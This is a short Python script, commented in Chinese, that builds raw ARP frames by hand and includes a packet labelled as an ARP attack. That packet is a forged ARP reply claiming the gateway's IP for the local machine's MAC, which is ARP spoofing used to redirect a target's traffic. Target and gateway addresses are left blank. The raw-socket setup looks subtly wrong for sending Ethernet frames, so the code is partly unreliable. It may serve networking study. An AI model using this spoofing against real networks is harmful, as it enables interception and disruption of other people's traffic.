import socket
import psutil
import struct
import time


def get_net_info(adapter_name):
    dic = psutil.net_if_addrs()
    ipv4 = ipv6 = mac = ""
    for adapter in dic:
        if adapter_name not in adapter:
            continue
        snicList = dic[adapter]
        mac = '无 mac 地址'
        ipv4 = '无 ipv4 地址'
        ipv6 = '无 ipv6 地址'
        for snic in snicList:
            if snic.family.name in {'AF_LINK', 'AF_PACKET'}:
                mac = snic.address
            elif snic.family.name == 'AF_INET':
                ipv4 = snic.address
            elif snic.family.name == 'AF_INET6':
                ipv6 = snic.address
        # print('%s, %s, %s, %s' % (adapter, mac, ipv4, ipv6))
    return (ipv4, mac)

def toHex(type: int, data: str) -> bytes:
    hex_ = b''
    if type == 0:  # ip
        ip_int = int.from_bytes(socket.inet_aton(data), byteorder='big')
        hex_str = hex(ip_int)[2:]
        hex_str = hex_str.zfill(8)
        hex_ = bytes.fromhex(hex_str)
    elif type == 1:  # mac
        mac_address = data.replace(':', '').replace('-', '')
        # 将十六进制字符串转换为字节对象
        hex_ = bytes.fromhex(mac_address)
    return hex_

# 构建自定义的数据包内容
class ARP:
    def __init__(self, destination_mac: bytes, source_mac: bytes, opcode: bytes,
                sender_mac: bytes, sender_ip: bytes, target_mac: bytes, target_ip: bytes) -> None:
        # 以太网帧
        self.destination_mac = destination_mac  # 目标MAC地址
        self.source_mac = source_mac  # 源MAC地址
        self.proto_type_eth = b'\x08\x06'  # 上层协议类型，0806表示ARP协议
        # ARP帧
        self.hardware_type = b'\x00\x01'  # 网络设备的硬件类型，0001表示以太网
        self.proto_type_arp = b'\x08\x00'  # 网络层协议类型，0800表示IPv4
        self.hardware_size = b'\x06'  # 硬件地址长度
        self.proto_size = b'\x04'  # 协议地址长度
        self.opcode = opcode  # 操作码，0001为ARP请求，0002为ARP响应，0003为RARP请求，0004为RARP响应
        self.sender_mac = sender_mac  # 发送方的MAC地址
        self.sender_ip = sender_ip  # 发送方的IP地址
        self.target_mac = target_mac  # 目标的MAC地址
        self.target_ip = target_ip  # 目标的IP地址

        # 总数据包
        self.packet = self.destination_mac + self.source_mac + self.proto_type_eth + \
            self.hardware_type + self.proto_type_arp + self.hardware_size + \
            self.proto_size + self.opcode + self.sender_mac + \
            self.sender_ip + self.target_mac + self.target_ip
        
    def packets(self):
        print(self.packet.hex())


if __name__ == "__main__":
    # 目标IP
    ip_target = ""
    mac_target = toHex(1, "")
    ip_gate = toHex(0, "")
    # 获取本机信息
    ipv4, mac = get_net_info("enth0")  # 调制解调器名称
    print(f'本机IP: {ipv4}\n本机MAC: {mac}\n目标IP:{ip_target}')
    ipv4_self = toHex(0, ipv4)
    mac_self = toHex(1, mac)
    # arp请求
    arp_request = ARP(b'\xff\xff\xff\xff\xff\xff',  # 广播
                    mac_self,
                    b'\x00\x01',  # 请求
                    mac_self,
                    ipv4_self,
                    b'\x00\x00\x00\x00\x00\x00',  # 未知
                    toHex(0, ip_target))  # 目标IP
    # arp_request.packets()
    # arp攻击
    arp_attact = ARP(mac_target,
                    mac_self,
                    b'\x00\x02',
                    mac_self,
                    ip_gate,
                    mac_target,
                    toHex(0, ip_target))
    # 创建原始套接字
    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.htons(0x0800))
    print("创建套接字")
    # 绑定到指定的网络接口
    raw_socket.bind((ipv4, 0))
    print("正在发送")
    request = 1
    if request:
        raw_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        raw_socket.sendto(arp_request.packet, (ip_target, 0))
    if not request:
        print(arp_attact.packet.hex())
        print("attacking...")
        raw_socket.sendto(arp_attact.packet, (ip_target, 0))
        # time.sleep(3)

